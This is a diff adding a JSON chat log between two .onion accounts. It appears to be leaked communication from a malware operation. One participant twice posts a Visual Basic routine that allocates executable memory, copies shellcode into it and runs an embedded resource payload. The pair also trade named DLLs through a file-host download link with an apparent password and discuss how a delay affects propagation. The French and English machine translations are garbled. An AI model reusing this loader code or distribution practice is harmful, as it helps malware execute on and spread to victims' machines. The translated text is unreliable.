@@ -1,0 +1,163 @@
+{
+    "2021-02-19T11:38:45.303267": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "еще тот нужен",
+        "body_fr": "toujours besoin",
+        "body_en": "still need it"
+    },
+    "2021-02-24T20:31:12.123521": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "Function TestFunc() As Boolean\n    \n    hInstance = GetModuleHandle(ByVal 0&)\n    \n    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)\n    \n    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)\n    \n    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght\n    \n    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)\n    \n    InitMyShellCode (tDis)\n\n    Dim hResource       As Long:                Dim hMememory       As Long\n    Dim lResSize        As Long:                Dim pRawData        As Long\n\n    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)\n    \n    hMememory = LoadResource(hInstance, hResource)\n    \n    lResSize = SizeofResource(hInstance, hResource)\n    \n    pRawData = LockResource(hMememory)\n    \n    Dim ret As Variant\n    ret = MessageBox(0, \"0\", \"0\", 0)\n\n    BexToPointer pRawData\n        \n    \nEnd Function",
+        "body_fr": "Fonction testfunc () comme booléen\n    \n    Hinstance = getmodulehandle (byval 0 &)\n    \n    Tlenght = MHCP (addition ttshellstart) - MHCP (addition t tshellend)\n    \n    TDIS = Virtualalloc (BYVAL 0 & TLENGHT, MEM_COMMIT, & H40)\n    \n    CopyMémoire BYVAL TDIS, BYVAL MHCP (adresse de tculquement), TLENGHT\n    \n    TSPLICEFROMRES ADRESSOF BEXTOPOINTER, TDIS + MHCP (Address Fonent) - MHCP (adresse de t tshellend)\n    \n    Initmyshellcode (TDIS)\n\n    Dim Hresource There: Dim HMEMEMORIEL SUR LA TERME\n    Dim Lressize There: Dim Prawdata aussi longtemps\n\n    Hresource = Findresource (Hinstance, GetString (Project), RT_RCDATA)\n    \n    HMEMEMORY = LOADRESOURCE (hinstance, hresource)\n    \n    Lrressiondizer = Tailleofresource (Hinstance, Hresource)\n    \n    Prawdata = Lockresource (hmememorie)\n    \n    Dim RET comme variante\n    RET = MessageBox (0, \"0\", \"0\", 0)\n\n    Bexopointer prawdata.\n        \n    \nFonction finale.",
+        "body_en": "Function TestFunc () as Boolean\n    \n    Hinstance = GetModuleHandle (Byval 0 &)\n    \n    TLENGHT = MHCP (Addness TshellStart) - MHCP (Addness Tshellend)\n    \n    TDIS = VirtualAlloc (Byval 0 & Tlenght, Mem_Commit, & H40)\n    \n    CopyMemory Byval Tdis, Byval MHCP (Addressof Tshellend), Tlenght\n    \n    TspliceFromres Addressof BextoPointer, TDIS + MHCP (Address FConent) - MHCP (Addressof Tshellend)\n    \n    InitmyshellCode (TDIS)\n\n    Dim Hresource AS Long: Dim Hmememory AS Long\n    Dim Lressize AS Long: Dim Prawdata AS Long\n\n    Hresource = FindResource (Hinstance, GetString (Project), RT_RCDATA)\n    \n    Hmememory = LoadResource (Hinstance, Hresource)\n    \n    Lressize = Sizeofresource (Hinstance, Hresource)\n    \n    Prawdata = LockResource (Hmememory)\n    \n    DIM RET AS VARIANT\n    RET = MessageBox (0, \"0\", \"0\", 0)\n\n    BEXTOPOINTER PRAWDATA.\n        \n    \nEnd Function."
+    },
+    "2021-02-24T20:31:27.659449": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "так блиг тоже не работает(( создаю ехе работает",
+        "body_fr": "alors tournant aussi ne fonctionne pas (i crée des œuvres exe",
+        "body_en": "so turning also does not work ((I create EXE works"
+    },
+    "2021-02-24T20:32:16.785298": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, \"0\", \"0\", 0) и все.. но ошибки нет типо ресурс не найден",
+        "body_fr": "Je crée une DLL (il peut être irrémédiable ou quelque chose d'autre nécessaire) ne fonctionne pas d'atteindre RET = MessageBox (0, \"0\", \"0\", 0) et tout .. mais aucune erreur n'a un type de ressource introuvable",
+        "body_en": "I create a DLL (it can be unreimible or something else necessary) does not work reaching RET = MessageBox (0, \"0\", \"0\", 0) and all .. but no errors have a type of resource not found"
+    },
+    "2021-02-25T06:52:19.949229": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "так блиг тоже не работает(( создаю ехе работает",
+        "body_fr": "alors tournant aussi ne fonctionne pas (i crée des œuvres exe",
+        "body_en": "so turning also does not work ((I create EXE works"
+    },
+    "2021-02-25T06:52:19.951729": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "Function TestFunc() As Boolean\n    \n    hInstance = GetModuleHandle(ByVal 0&)\n    \n    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)\n    \n    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)\n    \n    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght\n    \n    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)\n    \n    InitMyShellCode (tDis)\n\n    Dim hResource       As Long:                Dim hMememory       As Long\n    Dim lResSize        As Long:                Dim pRawData        As Long\n\n    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)\n    \n    hMememory = LoadResource(hInstance, hResource)\n    \n    lResSize = SizeofResource(hInstance, hResource)\n    \n    pRawData = LockResource(hMememory)\n    \n    Dim ret As Variant\n    ret = MessageBox(0, \"0\", \"0\", 0)\n\n    BexToPointer pRawData\n        \n    \nEnd Function",
+        "body_fr": "Fonction testfunc () comme booléen\n    \n    Hinstance = getmodulehandle (byval 0 &)\n    \n    Tlenght = MHCP (addition ttshellstart) - MHCP (addition t tshellend)\n    \n    TDIS = Virtualalloc (BYVAL 0 & TLENGHT, MEM_COMMIT, & H40)\n    \n    CopyMémoire BYVAL TDIS, BYVAL MHCP (adresse de tculquement), TLENGHT\n    \n    TSPLICEFROMRES ADRESSOF BEXTOPOINTER, TDIS + MHCP (Address Fonent) - MHCP (adresse de t tshellend)\n    \n    Initmyshellcode (TDIS)\n\n    Dim Hresource There: Dim HMEMEMORIEL SUR LA TERME\n    Dim Lressize There: Dim Prawdata aussi longtemps\n\n    Hresource = Findresource (Hinstance, GetString (Project), RT_RCDATA)\n    \n    HMEMEMORY = LOADRESOURCE (hinstance, hresource)\n    \n    Lrressiondizer = Tailleofresource (Hinstance, Hresource)\n    \n    Prawdata = Lockresource (hmememorie)\n    \n    Dim RET comme variante\n    RET = MessageBox (0, \"0\", \"0\", 0)\n\n    Bexopointer prawdata.\n        \n    \nFonction finale.",
+        "body_en": "Function TestFunc () as Boolean\n    \n    Hinstance = GetModuleHandle (Byval 0 &)\n    \n    TLENGHT = MHCP (Addness TshellStart) - MHCP (Addness Tshellend)\n    \n    TDIS = VirtualAlloc (Byval 0 & Tlenght, Mem_Commit, & H40)\n    \n    CopyMemory Byval Tdis, Byval MHCP (Addressof Tshellend), Tlenght\n    \n    TspliceFromres Addressof BextoPointer, TDIS + MHCP (Address FConent) - MHCP (Addressof Tshellend)\n    \n    InitmyshellCode (TDIS)\n\n    Dim Hresource AS Long: Dim Hmememory AS Long\n    Dim Lressize AS Long: Dim Prawdata AS Long\n\n    Hresource = FindResource (Hinstance, GetString (Project), RT_RCDATA)\n    \n    Hmememory = LoadResource (Hinstance, Hresource)\n    \n    Lressize = Sizeofresource (Hinstance, Hresource)\n    \n    Prawdata = LockResource (Hmememory)\n    \n    DIM RET AS VARIANT\n    RET = MessageBox (0, \"0\", \"0\", 0)\n\n    BEXTOPOINTER PRAWDATA.\n        \n    \nEnd Function."
+    },
+    "2021-02-25T06:52:19.953182": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, \"0\", \"0\", 0) и все.. но ошибки нет типо ресурс не найден",
+        "body_fr": "Je crée une DLL (il peut être irrémédiable ou quelque chose d'autre nécessaire) ne fonctionne pas d'atteindre RET = MessageBox (0, \"0\", \"0\", 0) et tout .. mais aucune erreur n'a un type de ressource introuvable",
+        "body_en": "I create a DLL (it can be unreimible or something else necessary) does not work reaching RET = MessageBox (0, \"0\", \"0\", 0) and all .. but no errors have a type of resource not found"
+    },
+    "2021-03-22T12:19:25.202777": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "привет",
+        "body_fr": "Hé",
+        "body_en": "Hey"
+    },
+    "2021-06-24T10:00:13.396963": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "залиты свежие"
+    },
+    "2021-07-21T09:08:01.550779": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "привет дай плз зев и сат дллы"
+    },
+    "2021-07-21T09:08:19.582145": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "привет, скоро закину"
+    },
+    "2021-07-21T09:44:11.820849": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "1e3Q2erBxddcF52cd0r\nDownload: https://qaz.im/load/ZYyR5G/AnrEzG\nDelete: https://qaz.im/index.php?a=delete&q=1233836586"
+    },
+    "2021-07-21T09:45:54.247760": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "ok sps"
+    },
+    "2021-07-21T10:16:24.944798": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "а задержка на файлах если ставить"
+    },
+    "2021-07-21T10:16:34.913834": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "влияет на размножение"
+    },
+    "2021-07-21T10:16:36.482960": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "?"
+    },
+    "2021-07-21T10:20:40.337800": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "а задержка на файлах если ставить"
+    },
+    "2021-07-21T10:20:40.340434": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "влияет на размножение"
+    },
+    "2021-07-21T10:20:40.344939": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "?"
+    },
+    "2021-08-04T11:56:32.575553": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-09-10T11:29:16.695158": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "zev4.dll и zem1.dll дай плз"
+    },
+    "2021-09-10T11:30:47.627772": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "ща"
+    },
+    "2021-09-22T12:04:31.571391": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "бро дай роб.133 длл"
+    },
+    "2021-09-22T12:04:38.831073": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "плиз"
+    },
+    "2021-09-22T12:04:50.803096": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "привкт"
+    },
+    "2021-09-22T12:06:13.494129": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-09-28T15:26:11.916330": {
+        "src": "hof@q3mcco35auwcstmt.onion",
+        "dst": "many@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-10-26T12:18:54.785403": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "привет на 170 группу тройки строка"
+    },
+    "2021-12-08T12:17:48.435738": {
+        "src": "many@q3mcco35auwcstmt.onion",
+        "dst": "hof@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    }
+}
